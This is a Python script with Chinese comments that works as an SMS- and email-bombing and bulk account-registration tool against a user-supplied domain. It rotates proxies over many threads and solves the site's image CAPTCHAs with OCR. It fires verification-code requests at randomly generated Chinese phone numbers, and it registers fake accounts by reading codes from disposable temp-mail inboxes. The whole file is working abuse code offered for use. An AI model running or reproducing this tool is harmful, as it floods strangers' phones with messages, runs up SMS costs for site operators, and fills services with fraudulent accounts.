import random
import threading
import time

import requests
from scapy.all import *
from selenium.webdriver.support.wait import WebDriverWait
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from selenium import webdriver
from selenium.webdriver.support import expected_conditions as ec
import ddddocr

# 忽略verifyssl报错
disable_warnings(InsecureRequestWarning)

mutex = threading.Lock()
x, y, z, n = 0, 0, 0, 0

captcha_url = "/verify?name=allow_register_phone_captcha"
# captcha_url = "/welcome/captcha"
sms_send_url = "/register_phone_send"
# sms_send_url = "/welcome/send_sms"
captcha_data = "phone=#phone#&phone_code=%2B86&captcha=#code#"
# captcha_data = "to=#phone#&mark=register_verify&captcha=#code#&country_id=37"


ocr = ddddocr.DdddOcr(beta=True)


def generate_random_str(randomlength=16):
    """
  生成一个指定长度的随机字符串
  """
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(randomlength):
        random_str += base_str[random.randint(0, length)]
    return random_str


def get_phone_num():
    second_spot = random.choice([3, 4, 5, 7, 8])
    third_spot = {3: random.randint(0, 9),
                  4: random.choice([5, 7, 9]),
                  5: random.choice([i for i in range(10) if i != 4]),
                  7: random.choice([i for i in range(10) if i not in [4, 9]]),
                  8: random.randint(0, 9), }[second_spot]
    remain_spot = random.randint(9999999, 100000000)
    phone_num = "1{}{}{}".format(second_spot, third_spot, remain_spot)
    return phone_num


def send(captcha, url, proxy, send_type, email_suffix: str):
    global mutex, x, y, z, n, captcha_url, captcha_data, sms_send_url
    print("本次ip：" + proxy)
    # 获取手机号
    phone = get_phone_num()
    # 如果有验证码
    try:
        if send_type == "phone":
            o = 0
            if captcha == 'y':
                while True:
                    req = requests.get(url + captcha_url,
                                       headers={
                                           "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                           "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                         "like Gecko) Chrome/50.0.2661.87 Safari/537.36 ",
                                       },
                                       proxies={
                                           'http': 'http://' + proxy,
                                           'https': 'https://' + proxy
                                       }, verify=False)
                    cookies = ''
                    for item in req.cookies.keys():
                        if req.cookies.get(name=item, domain=url) is None:
                            continue
                        cookies += item + '=' + req.cookies.get(name=item, domain=url) + ';'
                    file = io.BytesIO(req.content)
                    orc = ocr.classification(file.read())
                    # orc = requests.post("http://127.0.0.1:9898/ocr/file", files={'image': file})
                    resp = requests.post(url + sms_send_url, cookies=req.cookies,
                                         data=captcha_data.replace("#phone#", phone).replace("#code#", orc),
                                         headers={
                                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                           "like Gecko) Chrome/50.0.2661.87 Safari/537.36 ",
                                         },
                                         proxies={
                                             'http': 'http://' + proxy,
                                             'https': 'https://' + proxy
                                         }, verify=False)

                    print(proxy + "：" + resp.text)
                    if '发送失败' in resp.text:
                        if o == 2:
                            mutex.acquire()
                            x += 1
                            n -= 1
                            mutex.release()
                            break
                        o += 1
                        continue
                    if '/_guard/auto.js' in resp.text:
                        time.sleep(5)
                        continue
                    if '图形' in resp.json()['msg']:
                        continue
                    if resp.json()['status'] == 200 or "同一个ip" in resp.json()['msg'] or "五分钟" in resp.json()[
                        'msg']:
                        mutex.acquire()
                        x += 1
                        n -= 1
                        mutex.release()
                        break
            elif captcha == 'chz':
                while True:
                    req = requests.get(url + captcha_url,
                                       headers={
                                           "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                           "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                         "like Gecko) Chrome/50.0.2661.87 Safari/537.36 ",
                                       },
                                       proxies={
                                           'http': 'http://' + proxy,
                                           'https': 'https://' + proxy
                                       }, verify=False)
                    file = io.BytesIO(req.content)
                    orc = ocr.classification(file.read())
                    # orc = requests.post("http://127.0.0.1:9898/ocr/file", files={'image': file})
                    resp = requests.post(url + sms_send_url, cookies=req.cookies,
                                         data=captcha_data.replace("#phone#", phone).replace("#code#", orc),
                                         headers={
                                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                           "like Gecko) Chrome/50.0.2661.87 Safari/537.36 ",
                                         },
                                         proxies={
                                             'http': 'http://' + proxy,
                                             'https': 'https://' + proxy
                                         }, verify=False)
                    print(resp.content.decode("unicode-escape"))
                    if '图形' in resp.json()['msg']:
                        continue
                    if resp.json()['code'] == 0 or "同一个ip" in resp.json()['msg'] or "五分钟" in resp.json()['msg']:
                        mutex.acquire()
                        x += 1
                        n -= 1
                        mutex.release()
                        break
            else:
                for i in range(3):
                    req = requests.get(url + '/register_phone_send', headers={
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                      "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                    }, proxies={
                        'http': 'http://' + proxy,
                        'https': 'https://' + proxy
                    }, timeout=30)
                    req.close()
                    resp = requests.post(url + '/register_phone_send', cookies=req.cookies,
                                         headers={
                                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                           "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                         },
                                         data='phone=' + phone + '&phone_code=%2B86',
                                         proxies={
                                             'http': 'http://' + proxy,
                                             'https': 'https://' + proxy
                                         }, timeout=30)
                    resp.close()
                    print(proxy + "：" + resp.text)
                    if '发送失败' in resp.text:
                        if o == 2:
                            mutex.acquire()
                            x += 1
                            n -= 1
                            mutex.release()
                            break
                        o += 1
                        continue
                    if '/_guard/auto.js' in resp.text:
                        time.sleep(5)
                        continue
                    if resp.json()['status'] == 200 or "同一个ip" in resp.json()['msg'] or "五分钟" in resp.json()[
                        'msg']:
                        mutex.acquire()
                        x += 1
                        n -= 1
                        mutex.release()
                        break
        elif send_type == "in_phone":
            if captcha == "y":
                while True:
                    phone = get_phone_num()
                    # 创建邮箱
                    resp = requests.get("https://deepyinc.com/api/v1/mailbox/keepalive?mailbox=", verify=False,
                                        headers={
                                            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                          "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                        }, proxies={"https": "https://127.0.0.1:10087"})
                    resp.close()
                    if resp.json()['error_status'] == 0:
                        prefix = resp.json()['mailbox']
                    else:
                        continue
                    req = requests.get(url + '/verify?name=allow_register_email_captcha',
                                       headers={
                                           "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                           "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                         "like Gecko) Chrome/50.0.2661.87 Safari/537.36 ",
                                       },
                                       proxies={
                                           'http': 'http://' + proxy,
                                           'https': 'https://' + proxy
                                       }, verify=False)
                    file = io.BytesIO(req.content)
                    orc = ocr.classification(file.read())
                    # orc = requests.post("http://127.0.0.1:9898/ocr/file", files={'image': file})
                    # 发送验证码
                    resp = requests.post(url + '/register_email_send', cookies=req.cookies,
                                         headers={
                                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                           "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                         },
                                         data='email=' + prefix + email_suffix + "&captcha=" + orc,
                                         proxies={
                                             'http': 'http://' + proxy,
                                             'https': 'https://' + proxy
                                         }, timeout=30)

                    print("邮箱验证码发送：" + resp.text)
                    resp.close()
                    # 如果成功了
                    if resp.json()['status'] == 200:
                        # 等待十秒获取邮件
                        time.sleep(10)
                        for i in range(2):
                            resp = requests.get("https://linshiyouxiang.net/api/v1/mailbox/" + prefix,
                                                headers={
                                                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                                  "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                                }, verify=False, proxies={"https": "https://127.0.0.1:10087"})
                            resp.close()
                            if len(resp.json()) == 0:
                                time.sleep(3)
                            else:
                                break
                        if len(resp.json()) == 0:
                            continue
                        # if resp.json()[0]['subject'] == '验证码'
                        email_id = resp.json()[0]['id']
                        email_content = requests.get(
                            "https://linshiyouxiang.net/api/v1/mailbox/{}/{}".format(prefix, email_id), headers={
                                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                              "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                            }, verify=False, proxies={"https": "https://127.0.0.1:10087"})
                        # 正则匹配
                        t_yzm = re.findall('bold;">[0-9]+</span>', email_content.json()['body']['html'])
                        # 获取验证码
                        yzm = t_yzm[0].replace('bold;">', '').replace('</span>', '')
                        resp = requests.post(url + "/register?action=email",
                                             data="email={}&code={}&qq={}&password={}&checkPassword={}&free-agree=on".format(
                                                 prefix + email_suffix, yzm, phone, phone, phone),
                                             headers={
                                                 "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                               "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                             }, proxies={
                                'http': 'http://' + proxy,
                                'https': 'https://' + proxy
                            }, verify=False)
                        resp.close()
                        if not '用户中心' in resp.text:
                            continue
                        resp = requests.get(url + "/bind_phone", data="phone_code=%2B86&phone={}".format(phone),
                                            headers={
                                                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                              "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                            }, proxies={
                                'http': 'http://' + proxy,
                                'https': 'https://' + proxy
                            }, verify=False, cookies=resp.cookies)
                        print("站内绑定验证码：" + resp.text)
                        print(prefix + email_suffix + "|" + phone)
                        if resp.json()['status'] == 200 or "同一个ip" in resp.json()['msg'] or "五分钟" in resp.json()[
                            'msg']:
                            mutex.acquire()
                            x += 1
                            n -= 1
                            mutex.release()
                            break
                    else:
                        mutex.acquire()
                        y += 1
                        n -= 1
                        mutex.release()
                        break
            else:
                while True:
                    phone = get_phone_num()
                    # 创建邮箱
                    resp = requests.get("https://deepyinc.com/api/v1/mailbox/keepalive?mailbox=", verify=False,
                                        headers={
                                            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                          "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                        }, proxies={"https": "https://127.0.0.1:10087"})
                    resp.close()
                    if resp.json()['error_status'] == 0:
                        prefix = resp.json()['mailbox']
                    else:
                        continue
                    req = requests.get(url + '/register_email_send')
                    req.close()
                    # 发送验证码
                    resp = requests.post(url + '/register_email_send', cookies=req.cookies,
                                         headers={
                                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                           "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                         },
                                         data='email=' + prefix + email_suffix,
                                         proxies={
                                             'http': 'http://' + proxy,
                                             'https': 'https://' + proxy
                                         }, timeout=30)

                    print("邮箱验证码发送：" + resp.text)
                    resp.close()
                    # 如果成功了
                    if resp.json()['status'] == 200:
                        # 等待十秒获取邮件
                        time.sleep(10)
                        for i in range(2):
                            resp = requests.get("https://linshiyouxiang.net/api/v1/mailbox/" + prefix,
                                                headers={
                                                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                                  "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                                }, verify=False, proxies={"https": "https://127.0.0.1:10087"})
                            resp.close()
                            if len(resp.json()) == 0:
                                time.sleep(3)
                            else:
                                break
                        if len(resp.json()) == 0:
                            continue
                        # if resp.json()[0]['subject'] == '验证码'
                        email_id = resp.json()[0]['id']
                        email_content = requests.get(
                            "https://linshiyouxiang.net/api/v1/mailbox/{}/{}".format(prefix, email_id), headers={
                                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                              "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                            }, verify=False, proxies={"https": "https://127.0.0.1:10087"})
                        # 正则匹配
                        t_yzm = re.findall('bold;">[0-9]+</span>', email_content.json()['body']['html'])
                        # 获取验证码
                        yzm = t_yzm[0].replace('bold;">', '').replace('</span>', '')
                        resp = requests.post(url + "/register?action=email",
                                             data="email={}&code={}&qq={}&password={}&checkPassword={}&free-agree=on".format(
                                                 prefix + email_suffix, yzm, phone, phone, phone),
                                             headers={
                                                 "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                               "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                             }, proxies={
                                'http': 'http://' + proxy,
                                'https': 'https://' + proxy
                            }, verify=False)
                        resp.close()
                        print()
                        if not '用户中心' in resp.text:
                            continue
                        resp = requests.get(url + "/bind_phone", data="phone_code=%2B86&phone={}".format(phone),
                                            headers={
                                                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                              "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                            }, proxies={
                                'http': 'http://' + proxy,
                                'https': 'https://' + proxy
                            }, verify=False, cookies=resp.cookies)
                        print("站内绑定验证码：" + resp.text)
                        print(prefix + email_suffix + "|" + phone)
                        if resp.json()['status'] == 200 or "同一个ip" in resp.json()['msg'] or "五分钟" in resp.json()[
                            'msg']:
                            mutex.acquire()
                            x += 1
                            n -= 1
                            mutex.release()
                            break
                    else:
                        mutex.acquire()
                        y += 1
                        n -= 1
                        mutex.release()
                        break
        else:
            req = requests.get(url + '/register_email_send')
            req.close()
            resp = requests.post(url + '/register_email_send', cookies=req.cookies,
                                 headers={
                                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                     "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                   "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                 },
                                 data='email=' + phone + '@163.com',
                                 proxies={
                                     'http': 'http://' + proxy,
                                     'https': 'https://' + proxy
                                 }, timeout=30)

            print(resp.text)
            resp.close()
            if resp.json()['status'] == 200 or "同一个ip" in resp.json()['msg'] or "五分钟" in resp.json()[
                'msg']:
                mutex.acquire()
                x += 1
                n -= 1
                mutex.release()
    except Exception as e:
        print(e)
        mutex.acquire()
        y += 1
        n -= 1
        mutex.release()


def nium(captcha, url, proxy, send_type, email_suffix: str):
    global x, y, n, mutex
    try:
        while True:
            print('--proxy-server=%s' % proxy)
            opts = webdriver.ChromeOptions()
            opts.add_argument('--disable-gpu')  # 禁用显卡
            opts.add_argument('blink-settings=imagesEnabled=false')
            opts.add_argument("--incognito")
            opts.add_argument('--proxy-server=%s' % proxy)
            # opts.add_argument('--headless')
            web = webdriver.Chrome(options=opts)
            web.get(url)
            boolean = WebDriverWait(web, 15).until(ec.title_contains('云'))
            web.quit()
            if boolean:
                send(captcha, url, proxy, send_type, email_suffix)
                break
            else:
                continue
    except Exception as e:
        print(e)
        mutex.acquire()
        y += 1
        n -= 1
        mutex.release()


if __name__ == '__main__':
    scheme = input("请输入协议头：")
    domain = input("请输入域名：")
    captch = input("是否启用验证码（y / n / chz）：")
    ty_pe = input("代理类型（file/dist）：")
    proxy_file = input("代理ip文件（内容格式 ip:prot）：")
    thread_num = int(input("线程数："))
    send_type = input("发信类型（phone/email/in_phone）：")

    # scheme = "https"
    # domain = "xxx.cc"
    # captch = "y"  # y / n / chz
    email_suffix = "@temporary-mail.net"
    # send_type = 'in_phone'  # phone / email / in_phone
    # ty_pe = 'dist'  # file / dist
    # thread_num = 15
    url = scheme + "://" + domain
    attack = False
    if ty_pe == 'dist':
        proxya = ['127.0.0.1:10809']

        z = len(proxya)
        i = 0
        while True:
            print("当前执行{}次，成功{}，失败{}，线程数为{}".format(z, x, y, str(n)))
            if i == len(proxya):
                if x + y == z:
                    break
                else:
                    time.sleep(3)
                    continue
            if n < thread_num:
                print("开启线程")
                t = threading.Thread(target=send, args=(captch, url, proxya[i], send_type, email_suffix))
                t.start()
                i += 1
                mutex.acquire()
                n += 1
                mutex.release()
            else:
                time.sleep(3)
    else:
        # proxy_file = 'proxy_file.txt'
        f = open(proxy_file)
        proxys = f.readlines()
        z = len(proxys)
        i = 0
        while True:
            print("当前执行{}次，成功{}，失败{}，线程数为{}".format(z, x, y, str(n)))
            if i == len(proxys):
                if x + y == z:
                    break
                else:
                    time.sleep(3)
                    continue
            if n < thread_num:
                print("开启线程")
                if attack:
                    t = threading.Thread(target=nium,
                                         args=(captch, url, proxys[i].replace('\r', '').replace('\n', ''), send_type,
                                               email_suffix))
                    t.start()
                    i += 1
                    mutex.acquire()
                    n += 1
                    mutex.release()
                else:
                    t = threading.Thread(target=send,
                                         args=(captch, url, proxys[i].replace('\r', '').replace('\n', ''), send_type,
                                               email_suffix))
                    t.start()
                    i += 1
                    mutex.acquire()
                    n += 1
                    mutex.release()
            else:
                time.sleep(3)

    print("结束，共执行{}次，成功{}，失败{}".format(z, x, y))
